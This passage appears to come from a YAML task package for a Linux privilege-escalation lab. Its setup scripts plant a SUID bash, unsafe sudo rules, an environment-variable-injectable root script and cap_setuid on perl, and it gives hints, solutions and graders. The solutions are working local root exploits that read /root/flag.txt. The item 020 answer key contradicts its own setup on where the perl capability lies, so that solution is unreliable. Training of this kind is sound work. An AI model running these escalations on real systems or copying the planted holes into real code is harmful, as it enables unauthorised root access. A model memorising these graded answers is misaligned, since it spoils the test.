    - "Part 2: replace the `vi` line with `%labs ALL=(root) NOPASSWD: /usr/bin/id`, then check `visudo -cf /lab/kl-sudoers`."
  solution: |
    ```bash
    # Part 1 — strip the SUID bit
    sudo chmod u-s /opt/backup/bash
    find /opt/backup -perm -4000      # (no output = fixed)

    # Part 2 — replace the editor grant with a harmless one
    cat > /lab/kl-sudoers <<'EOF'
    %labs ALL=(root) NOPASSWD: /usr/bin/id
    EOF
    visudo -cf /lab/kl-sudoers        # parsed OK
    ```
  setup: |
    echo ok > "$KL_STATE/answer"
    # --- part 1: Take away the SUID bit ---
    install -d -m 755 /opt/backup
    install -m 4755 -o root -g root /usr/bin/bash /opt/backup/bash
    U=$(lab_user)
    printf '%s ALL=(root) NOPASSWD: /usr/bin/chmod\n' "$U" > /etc/sudoers.d/kl-chmod
    chmod 440 /etc/sudoers.d/kl-chmod
    on_reset 'rm -rf /opt/backup; rm -f /etc/sudoers.d/kl-chmod'
    # --- part 2: Fix the sudo rule ---
    lab_file /lab/kl-sudoers <<'EOF'
    %labs ALL=(root) NOPASSWD: /usr/bin/vi
    EOF
  check: |
    info "Part 1: Take away the SUID bit"
    n=$(find /opt/backup -perm -4000 -type f 2>/dev/null | wc -l)
    check_eq "no SUID files remain under /opt/backup" "$n" "0"
    info "Part 2: Fix the sudo rule"
    check "sudoers file is syntactically valid" 'visudo -cf /lab/kl-sudoers'
    check_not "the dangerous /usr/bin/vi rule is gone" 'grep -qE "/usr/bin/vi( |$|m)" /lab/kl-sudoers'
    check "a safe NOPASSWD rule for /usr/bin/id remains" 'grep -qE "NOPASSWD:[[:space:]]*/usr/bin/id" /lab/kl-sudoers'
  solve: |
    # --- part 1 ---
    sudo chmod u-s /opt/backup/bash
    # --- part 2 ---
    cat > /lab/kl-sudoers <<'EOF'
    %labs ALL=(root) NOPASSWD: /usr/bin/id
    EOF

- id: offsec-priv-019
  title: Environment variable to root
  difficulty: 4
  kind: build
  tags: [privesc, sudo, env]
  scenario: |
    `sudo -l` shows you can run a backup script, **`/usr/bin/kl-backup`**, as root
    with NOPASSWD, and that sudo **lets you keep the `BACKUP_TAR` variable**
    (`env_keep` + `SETENV`). The script runs whatever `BACKUP_TAR` points at —
    defaulting to `tar` — so if you set it, your program runs **as root**.

    Point `BACKUP_TAR` at your own program and make it read **`/root/flag.txt`**
    into **`/lab/flag.txt`**.
  hints:
    - "The script does `\"${BACKUP_TAR:-tar}\" ...`. Write a script that copies the flag, then run `sudo BACKUP_TAR=/tmp/evil /usr/bin/kl-backup`."
    - "`printf '#!/bin/bash\\ncat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt\\n' > /tmp/evil; chmod +x /tmp/evil; sudo BACKUP_TAR=/tmp/evil /usr/bin/kl-backup`"
  solution: |
    ```bash
    printf '#!/bin/bash\ncat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt\n' > /tmp/evil
    chmod +x /tmp/evil
    sudo BACKUP_TAR=/tmp/evil /usr/bin/kl-backup
    ```

    (Note `PATH` wouldn't work here — sudo's `secure_path` overrides it. The
    script trusting a *different* environment variable is what opens the door.)
  setup: |
    root_flag >/dev/null
    cat > /usr/bin/kl-backup <<'EOF'
    #!/bin/bash
    # VULNERABLE: runs a program named by an attacker-controllable env var
    : "${BACKUP_TAR:=tar}"
    cd /var/backups 2>/dev/null || cd /
    "$BACKUP_TAR" czf /tmp/kl-backup.tar.gz /etc/hostname 2>/dev/null
    EOF
    chmod 755 /usr/bin/kl-backup
    U=$(lab_user)
    cat > /etc/sudoers.d/kl-backupcmd <<EOF
    Defaults:$U env_keep += "BACKUP_TAR"
    $U ALL=(root) NOPASSWD: SETENV: /usr/bin/kl-backup
    EOF
    chmod 440 /etc/sudoers.d/kl-backupcmd
    on_reset 'rm -f /usr/bin/kl-backup /etc/sudoers.d/kl-backupcmd'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    printf '#!/bin/bash\ncat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt\n' > /tmp/evil
    chmod +x /tmp/evil
    sudo BACKUP_TAR=/tmp/evil /usr/bin/kl-backup

- id: offsec-priv-020
  title: Incident — from shell to root
  difficulty: 5
  kind: build
  tags: [privesc, incident, enumeration]
  scenario: |
    You've landed an unprivileged shell on a box during an authorized engagement.
    Objective: become root and recover the trophy at **`/root/flag.txt`**, written
    to **`/lab/flag.txt`**.

    No vector is named. Enumerate properly — `sudo -l`, SUID
    (`find / -perm -4000 -type f 2>/dev/null`), capabilities
    (`getcap -r / 2>/dev/null`), cron (`/etc/cron.d`), writable config — find the
    single intended path, and use it.
  hints:
    - "Check `sudo -l` first; then capabilities with `getcap -r / 2>/dev/null`."
    - "`/usr/bin/perl` has `cap_setuid+ep`. `perl -e 'use POSIX qw(setuid); setuid(0); exec \"cat /root/flag.txt\";'` — redirect to the flag file."
  solution: |
    Enumeration shows a capability on `perl`:

    ```bash
    getcap -r / 2>/dev/null                    # /usr/bin/perl cap_setuid+ep
    perl -e 'use POSIX qw(setuid); setuid(0); exec "cat","/root/flag.txt";' > /lab/flag.txt
    ```
  setup: |
    root_flag >/dev/null
    # intended path: a capability on a copy of perl under /opt
    install -d -m 755 /opt/tools
    cp /usr/bin/perl /opt/tools/perl 2>/dev/null || cp "$(command -v perl)" /opt/tools/perl
    setcap cap_setuid+ep /opt/tools/perl
    on_reset 'rm -rf /opt/tools'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    /opt/tools/perl -e 'use POSIX qw(setuid); setuid(0); exec "cat","/root/flag.txt";' > /lab/flag.txt
